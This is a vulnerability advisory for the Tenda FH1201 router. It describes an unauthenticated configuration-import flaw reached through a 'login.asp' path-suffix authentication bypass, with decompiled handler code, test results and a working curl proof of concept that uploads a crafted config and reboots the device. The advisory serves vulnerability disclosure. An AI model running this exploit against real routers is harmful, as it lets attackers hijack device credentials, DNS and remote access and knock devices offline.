# CVE-TBD: Unauthenticated configuration import with marker-line-only validation in Tenda FH1201

## Summary

`POST /cgi-bin/UploadCfg` imports a configuration file. Its only integrity check is that the
uploaded text contains the literal line `Default` (the source comment says
`#The word of "Default" must not be removed`). There is no signature, checksum, key whitelist or
length validation, and the endpoint is reachable **without credentials** through the `login.asp`
authentication bypass. A 79-byte attacker-authored file is accepted, written verbatim to
`/var/default.cfg`, applied with `cfm Upload` and followed by a reboot.

## Affected Product

- Vendor: Tenda · Product: FH1201 · Firmware: **V1.2.0.19(946)** (latest, 2026-07-13)

- Status: the vendor lists FH1201 V1.0 as end-of-life (discontinued 2015) yet published
  firmware V1.2.0.19(946) on 2026-07-13 as a security update for CVE-2026-11405

## Vulnerability Details

- Type: Missing Authentication for Critical Function (**CWE-306**) + Insufficient Verification of Data
  Authenticity (**CWE-345**)
- Component: `bin/httpd` → `webs_Tenda_CGI_BIN_Handler` → `webCgiDoUpload` → `UploadCfg()`
- Root cause: the handler reads the multipart upload and validates it with a marker search only;
  on success it stores the file and delegates the apply step to the config manager:

```c
/* /cgi-bin/UploadCfg  (reachable pre-auth via the login.asp substring exemption) */
open("/var/default.cfg", O_WRONLY|O_CREAT|O_TRUNC, 0666);   /* uploaded bytes, verbatim */
system("cfm Upload");                                        /* apply */
websRedirect(wp, "//direct_reboot.asp");                     /* success: device reboots */
```
Validation matrix (dynamically measured):

| Uploaded content | Size | Result |
|---|---|---|
| Vendor's own `default.cfg` | 8587 B | `302 //direct_reboot.asp` (accepted) |
| Vendor config + injected `sys.targets=…` | 8573 B | accepted |
| **Minimal attacker file** (`#comment` + `Default` + one key) | **79 B** | **accepted** |
| Random bytes | 100 B | `302 //error.asp?2002` (rejected) |
| File without the `Default` line | 20 B | rejected |

## Proof of Concept (non-destructive variant: no configuration change beyond a marker key)

```bash
printf '#The word of "Default" must not be removed\r\nDefault\r\nsys.targets=CFGINJ_MARKER\r\n' > /tmp/c.cfg
curl -i -F 'file=@/tmp/c.cfg;filename=RouterCfg.cfg' \
     http://<router>/cgi-bin/UploadCfg/login.asp
#   HTTP/1.1 302   Location: //direct_reboot.asp      ← accepted, applied, device reboots
```

Control (same endpoint, no bypass suffix): `302 /login.asp` — i.e. the handler is authenticated by
design, and the bypass is what makes the attack unauthenticated.

`-strace` evidence for the accepted request:

```
open("/var/default.cfg", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 15
execve("/bin/sh", {"sh", "-c", "cfm Upload"}, …)
```

The file on disk was byte-identical to the upload (79 bytes).

## Impact

- An unauthenticated attacker can **replace the device configuration**: administrator credentials,
  wireless SSID/passphrase, DNS/DHCP settings, remote-management flags, port forwards, etc. The
  configuration persists across reboots, so this is a persistent compromise primitive.
- The import always ends in a reboot (`direct_reboot.asp`), which is an availability impact.
- Writing an inconsistent configuration can render the device unusable until a hardware reset.

## CVSS 3.1

`CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` — **6.5** (conservative)
Rationale: the acceptance, verbatim storage and `cfm Upload` invocation were verified; whether the
configuration reaches flash on real hardware could not be observed in emulation (no MTD), therefore
availability/integrity are scored on the verified parts only. Physical-device confirmation would
justify `A:L` (7.1) or, if a full administrative takeover is demonstrated, 8.8.

## Discovery

Discovered by Zimo-666 on 2026-10-17 via rehosting, `-strace` and content-controlled uploads.
Vendor notified: pending.
